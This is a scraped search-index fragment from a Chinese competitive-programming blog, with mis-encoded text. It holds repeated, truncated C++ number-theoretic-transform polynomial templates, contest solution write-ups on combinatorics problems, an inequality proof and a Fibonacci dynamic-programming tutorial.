power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-04-13","objectID":"/posts/cp2020-bsuirpc-function-analysis/:1:0","tags":["EGF","NTT"],"title":"[2020 BSUIRPC] Function analysis","uri":"/posts/cp2020-bsuirpc-function-analysis/"},{"categories":["æ•°å­¦"],"content":"ä»Šæ™šé—²æ¥æ— äº‹çœ‹äº†çœ‹ $2022$ å¹´çš„æµå—ä¸€æ¨¡æœ€åä¸€é¢˜ç¬¬ä¸‰é—®ï¼Œå‘ç°çœŸçš„æ˜¯ä¸¤å¹´æ²¡ç¢°é«˜è€ƒæ•°å­¦æ‰‹ç”Ÿç–äº†ï¼Œä¸è¿‡è¿˜å¥½åšå‡ºæ¥äº†ã€‚ é¢˜æ„ è¯æ˜ $$ \\sum_{x = 2}^{n} \\frac{1}{\\ln x} \u003e 1 - \\frac{1}{n} $$ åˆ†æï¼š $1 - \\dfrac{1}{n} = \\dfrac{n - 1}{n}$ï¼Œå·¦è¾¹æ˜¯ $n$ ä¸ªæ•°æ±‚å’Œï¼Œæ‰€ä»¥è€ƒè™‘è£‚é¡¹å³è¾¹ $$ \\frac{n - 1}{n} = \\frac{1}{1 \\times 2} + \\frac{1}{2 \\times 3} + \\cdots + \\frac{1}{(n - 1) \\times n} $$ æ¥ä¸‹æ¥åªéœ€è¯ $x ^ 2 - x - \\ln x \u003e 0 (x \\ge 2)$ è®¾ $f(x) = x ^ 2 - x - \\ln x$ åˆ™ $fâ€™(x) = \\dfrac{(2x+ 1)(x-1)}{x} \u003e 0$ ç”±äº $f(2) = 2 - \\ln2 \u003e 0$ æ‰€ä»¥ $f(x)\u003e 0$ ","date":"2022-04-06","objectID":"/posts/math-%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%BB%8F%E5%85%B8%E4%B8%8D%E7%AD%89%E5%BC%8F%E6%94%BE%E7%BC%A9/:0:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"è®°ä¸€ä¸ªç»å…¸ä¸ç­‰å¼æ”¾ç¼©","uri":"/posts/math-%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%BB%8F%E5%85%B8%E4%B8%8D%E7%AD%89%E5%BC%8F%E6%94%BE%E7%BC%A9/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„ $1 \\sim n$ æ’åˆ— $P$ï¼Œæ‰¾åˆ°æœ‰å¤šå°‘ä¸ª $1 \\sim n$ çš„æ’åˆ— $Q$ ä½¿å¾— $\\forall i \\in[1, n - 1], Q_{i + 1} \\ne P_{Q_i}$ å¯¹ $998244353$ å–æ¨¡ $(1 \\le n \\le 10 ^ 5, 1 \\le P_i \\le n)$ åˆ†æï¼š å¦‚æœåªè§‚å¯Ÿå¼å­å¯èƒ½çœ‹ä¸å‡ºä»€ä¹ˆè§„å¾‹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ¡ä»¶è½¬åŒ–ä¸º $n$ ä¸ªç‚¹çš„å›¾ï¼Œè€ƒè™‘æŠŠæ’åˆ— $Q$ è¡¨ç¤ºä¸ºè¾¹é›† ${(Q_1, Q_2),(Q_2, Q_3),\\cdots,(Q_{n-1},Q_n)}$ ï¼Œé‚£ä¹ˆæ’åˆ— $P$ çš„æ„æ€å°±æ˜¯å›¾ä¸­ä¸èƒ½å­˜åœ¨è¾¹é›† ${(1,P_1),(2,P_2),\\cdots,(n,P_n)}$ ï¼Œé‚£ä¹ˆå°±ç­‰ä»·äºåœ¨ä¸€å¼ å›¾ä¸­é€‰ä¸€æ¡å“ˆå¯†é¡¿è·¯å¾„çš„æ–¹æ¡ˆæ•°ï¼Œæ‰€ä»¥è€ƒè™‘å¯¹æ¯æ¡ä¸å­˜åœ¨çš„è¾¹é›†è¿›è¡Œå®¹æ–¥ã€‚è€ƒè™‘è®¡ç®—é€‰äº† $i$ ä¸ªä¸å­˜åœ¨çš„è¾¹çš„æ–¹æ¡ˆæ•°ï¼Œå‘ç°æ’åˆ— $P$ ä¸€å®šä¼šæˆç¯ï¼Œæ‰€ä»¥å¯¹äºæ¯ä¸ª $k$ å…ƒç¯å¯ä»¥é€‰æ‹© $0 \\sim k - 1$ ä¸ªä¸å­˜åœ¨çš„è¾¹(å“ˆå¯†é¡¿è·¯å¾„æ— ç¯æ‰€ä»¥ä¸èƒ½åŒ…å« $k$ ä¸ªä¸å­˜åœ¨çš„è¾¹)ï¼Œé‚£ä¹ˆå¯ä»¥ç”¨ç”Ÿæˆå‡½æ•° $f(k)$ æ¥è¡¨ç¤º $$ f(k) = 1 + \\binom{k}{1}x + \\binom{k}{2}x ^ 2 + \\binom{k}{3}x ^ 3 + \\cdots + \\binom{k}{k - 1}x ^ {k - 1} $$ $x$ é¡¹çš„ç³»æ•° $m$ è¡¨ç¤º $k$ å…ƒç¯ä¸­é€‰äº† $m$ æ¡ä¸å­˜åœ¨çš„è¾¹ï¼Œé‚£ä¹ˆç³»æ•°æ˜¾ç„¶æ˜¯ $\\dbinom{k}{m}$ æ‰€ä»¥åªéœ€æ‰¾å‡ºæ’åˆ— $P$ çš„æ‰€æœ‰ç¯åŠå…¶ç¯çš„å¤§å°ï¼Œå‡è®¾æœ‰ $t$ ä¸ª $a_1,a_2,\\cdots,a_t$ ï¼Œ$a_i$ è¡¨ç¤ºç¬¬ $i$ ä¸ªç¯çš„å¤§å°ã€‚ é‚£ä¹ˆæ–¹æ¡ˆå°±æ˜¯ $$ \\prod_{i = 1} ^ {t} f(a_i) $$ åšä¸€æ¬¡åˆ†æ²» $\\text{NTT}$ æˆ–å¯å‘å¼åˆå¹¶å¾—åˆ°å¤šé¡¹å¼ $F(x)$ æœ€åå®¹æ–¥è®¡ç®—ç­”æ¡ˆï¼Œé’¦å®šé€‰äº† $i$ æ¡ä¸å­˜åœ¨çš„è¾¹å…¶ä»–è¾¹çš„æ•°é‡å°±æ˜¯ $(n - i)!$ é‚£ä¹ˆæœ€åçš„ç­”æ¡ˆå°±ä¸º $$ \\sum_{i = 0} ^ {n}(-1) ^ i(n - i)![x^i]F(x) $$ æ—¶é—´å¤æ‚åº¦ $O(n\\log ^2n)$ ","date":"2022-03-26","objectID":"/posts/cp2021icpc%E4%B8%8A%E6%B5%B7-b-strange-permutations/:0:0","tags":["å®¹æ–¥åŸç†","åˆ†æ²» NTT"],"title":"[2021ICPCä¸Šæµ· B] Strange Permutations","uri":"/posts/cp2021icpc%E4%B8%8A%E6%B5%B7-b-strange-permutations/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-03-26","objectID":"/posts/cp2021icpc%E4%B8%8A%E6%B5%B7-b-strange-permutations/:1:0","tags":["å®¹æ–¥åŸç†","åˆ†æ²» NTT"],"title":"[2021ICPCä¸Šæµ· B] Strange Permutations","uri":"/posts/cp2021icpc%E4%B8%8A%E6%B5%B7-b-strange-permutations/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ ","date":"2022-02-04","objectID":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/:0:0","tags":["ç»„åˆè®¡æ•°","å®¹æ–¥åŸç†","å¤šé¡¹å¼å¿«é€Ÿå¹‚"],"title":"[2021CCPC å¨æµ·M] 810975","uri":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‰è¨€ ä»Šå¤©çœ‹äº†è¡£é”¦å¤œè¡Œ $2021$ å¹´åº¦ $\\text{top10}$ï¼Œçœ‹å®Œ $810975$ çªç„¶æƒ³èµ·æ¥è¿™é¢˜è¿˜æ²¡è¡¥å®Œä»£ç ï¼Œæœ€è¿‘åˆåˆšå­¦ä¹ äº†ä¸€ç‚¹å¤šé¡¹å¼ï¼Œå­¦å®Œå¤šé¡¹å¼å¿«é€Ÿå¹‚ä¹‹åç»ˆäºå¯ä»¥è¡¥è¿™é“é¢˜äº†ï¼Œæ‰€ä»¥å†³å®šé‡æ–°å†™ä¸€éå¯¹è¿™ä¸ªé¢˜å‘ä¸€ä¸ªé‡åˆ¶ç‰ˆçš„é¢˜è§£ å…ˆç§‘æ™®ä¸€ä¸‹ $810975$ æ˜¯ä»€ä¹ˆæ„æ€ï¼šçŸ¥åç‚‰çŸ³ä¼ è¯´ä¸»æ’­è¡£é”¦å¤œè¡Œåœ¨ $8$ æœˆ $10$ å·æ‰“äº† $9$ ç›˜é…’é¦†æˆ˜æ——ï¼Œåƒäº† $7$ é¸¡ï¼Œå…¶ä¸­ä¸€ä¸ªè¿˜æ˜¯ $5$ è¿é¸¡ï¼Œåæ¥å¤šæ¬¡åœ¨ç›´æ’­é—´ç–¯ç‹‚å¹å˜˜è‡ªå·±ï¼ŒèŠ‚ç›®æ•ˆæœæ‹‰æ»¡ https://www.bilibili.com/video/BV1Uy4y1V75X åæ¥ä¸Šäº† $317$ æœŸçš„é€—é±¼æ—¶åˆ»ï¼Œç‰‡å°¾ç»™å¤œå¹åšäº†ä¸€ä¸ªé¬¼ç•œ https://www.bilibili.com/video/BV11f4y1H7TJ æ·±åˆ»çš„è¢«æ´—è„‘äº†ï¼Œ$810975$ è¿˜è£ç™» $2021$ é€—é±¼æ—¶åˆ» $\\text{TOP50}$ çš„ $\\text{TOP0}$ (å‹è½´çº§åˆ«) é¡ºå¸¦ä¸€æï¼Œè¡£é”¦å¤œè¡Œæ˜¯æˆ‘æœ€å–œæ¬¢çš„ä¸»æ’­ï¼ŒæŠ€æœ¯ä¸é”™è™½ç„¶æœ‰æ—¶å€™å˜´å¾ˆç¡¬ï¼Œå› å¤ºå¾— $2020$ å¹´ä¸–ä¿±æ¯å† å†›è¢«ç§°ä¸ºâ€œä¸–ç•Œå† å†›â€ï¼Œå¯æƒœç°åœ¨åªæœ‰ $8000$ åˆ†å·¦å³ï¼Œä½†æ˜¯æˆ‘æœ€èµåŒä»–çš„ä¸€å¥è¯ï¼šåˆ†æ•°æ²¡æœ‰æ„ä¹‰ï¼Œå¿«ä¹æ‰æ˜¯çœŸè°›ã€‚ é¢˜æ„ å¤œå¹ä¸‹äº† $n$ ç›˜é…’é¦†æˆ˜æ——ï¼Œåƒäº† $m$ æ¬¡é¸¡ï¼Œå¹¶ä¸” $k$ è¿é¸¡ï¼Œæ±‚æ–¹æ¡ˆæ•°å¯¹ $998244353$ å–æ¨¡ã€‚ $0 \\le n,m,k \\le 10^5$ åˆ†æï¼š å·²çŸ¥ä¸‹äº† $n$ ç›˜æ£‹ï¼Œåƒäº† $m$ æ¬¡é¸¡ï¼Œæ‰€ä»¥æœ‰ $n - m$ å±€æ˜¯æœªåƒé¸¡çš„ï¼Œæ‰€ä»¥è€ƒè™‘æŠŠ $m$ æ¬¡é¸¡æ’ç©ºï¼Œ$n - m$ å±€æœªåƒé¸¡å±€æœ‰ $n - m + 1$ ä¸ªç©ºä½ï¼Œé‚£ä¹ˆæ¯ä¸ªç©ºçš„ç”Ÿæˆå‡½æ•°ä¸º $$ 1+x+x^2+x^3+\\cdots+x^k $$ æ‰€ä»¥æ‰€æœ‰çš„æ–¹æ¡ˆæ•°å°±ä¸º $$[x ^ m](1+x+x^2+x^3+\\cdots+x^k)^{n - m + 1}$$ $[x^m]$ è¡¨ç¤º $m$ æ¬¡é¡¹çš„ç³»æ•° è®° $f(k)$ ä¸º $n$ æŠŠ $m$ é¸¡ å°äºç­‰äº $k$ è¿é¸¡çš„æ–¹æ¡ˆæ•° é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $f(k) - f(k - 1)$ï¼Œå¯ä»¥ç”¨å¤šé¡¹å¼å¿«é€Ÿå¹‚æ¥æ±‚è§£ ","date":"2022-02-04","objectID":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/:1:0","tags":["ç»„åˆè®¡æ•°","å®¹æ–¥åŸç†","å¤šé¡¹å¼å¿«é€Ÿå¹‚"],"title":"[2021CCPC å¨æµ·M] 810975","uri":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-02-04","objectID":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/:2:0","tags":["ç»„åˆè®¡æ•°","å®¹æ–¥åŸç†","å¤šé¡¹å¼å¿«é€Ÿå¹‚"],"title":"[2021CCPC å¨æµ·M] 810975","uri":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7m-810975/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŠ¨æ€è§„åˆ’çš„å¼•å…¥ï¼šæ–æ³¢é‚£å¥‘æ•°åˆ— é¢˜ç›®é“¾æ¥ å·²çŸ¥æ–æ³¢é‚£å¥‘æ•°åˆ— $f_1 = 1, f_2 = 1, f_i = f_{i - 1} + f_{i - 2}, i \\ge 3$ ï¼Œç»™å®šæ­£æ•´æ•° $n$ ï¼Œæ±‚ $f_n \\bmod 10 ^ 9 + 7$ $3 \\le n \\le 2 \\times 10^6$ ç›´è§‚ä¸Šå¯ä»¥é‡‡ç”¨æœ€æš´åŠ›çš„æ–¹æ³•ï¼Œé€’å½’ã€‚ é€’å½’ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int mod = 1e9 + 7; int n; int f(int n) { if (n == 1 || n == 2) return 1; return (f(n - 1) + f(n - 2)) % mod; } signed main() { cin \u003e\u003e n; cout \u003c\u003c f(n) \u003c\u003c endl; } å¯ä»¥è¯•ä¸€ä¸‹ï¼Œè¿™ç§æ–¹æ³•åœ¨ $n = 45$ æ—¶å°±ä¼šè¶…æ—¶ï¼ŒåŸå› æ˜¯é€’å½’è€—è´¹äº†å¤§é‡çš„æ—¶é—´ï¼Œè®¡ç®—äº†è®¸å¤šé‡å¤çš„å­é—®é¢˜ã€‚ å‡è®¾ $n = 5$ é‚£ä¹ˆè®¡ç®— $f_5$ ä¼šå…ˆè®¡ç®— $f_3, f_4$ ï¼Œè®¡ç®— $f_3$ ä¼šè®¡ç®— $f_1,f_2$ ï¼Œè®¡ç®— $f_4$ ä¼šè®¡ç®— $f_2,f_3$ ï¼Œè¿™æ · $f_3$ å°±è¢«è®¡ç®—äº† $2$ æ¬¡ï¼Œå¦‚æœè§„æ¨¡æ›´å¤§ï¼Œä¼šè¢«é‡å¤è®¡ç®—å¾ˆå¤šæ¬¡ï¼Œæˆ‘ä»¬ç§°ä¸º**é‡å¤å­é—®é¢˜ **ã€‚ é‚£ä¹ˆè¦é¿å…é‡å¤è®¡ç®—æƒ…å†µæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„æ¥ä¿å­˜è®¡ç®—çš„ç»“æœï¼Œä½¿å¾—æ¯ä¸ªå€¼åªä¼šè¢«è®¡ç®— $1$ æ¬¡ï¼Œæˆ‘ä»¬ç§°ä¸ºè®°å¿†åŒ–æœç´¢ã€‚ è®°å¿†åŒ–æœç´¢ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 1e9 + 7; int n, dp[N]; int f(int n) { if (dp[n]) return dp[n]; return dp[n] = (f(n - 1) + f(n - 2)) % mod; } signed main() { dp[1] = dp[2] = 1; cin \u003e\u003e n; cout \u003c\u003c f(n) \u003c\u003c endl; } ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ•°ç»„è½¬ç§»ï¼Œè¿™æ˜¯ä¸€èˆ¬ $\\text{DP}$ çš„å¸¸è§„å†™æ³• DPä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5, mod = 1e9 + 7; int n, dp[N]; signed main() { dp[1] = dp[2] = 1; for (int i = 3; i \u003c N; i ++) dp[i] = (dp[i - 1] + dp[i - 2]) % mod; cin \u003e\u003e n; cout \u003c\u003c dp[n] \u003c\u003c endl; } 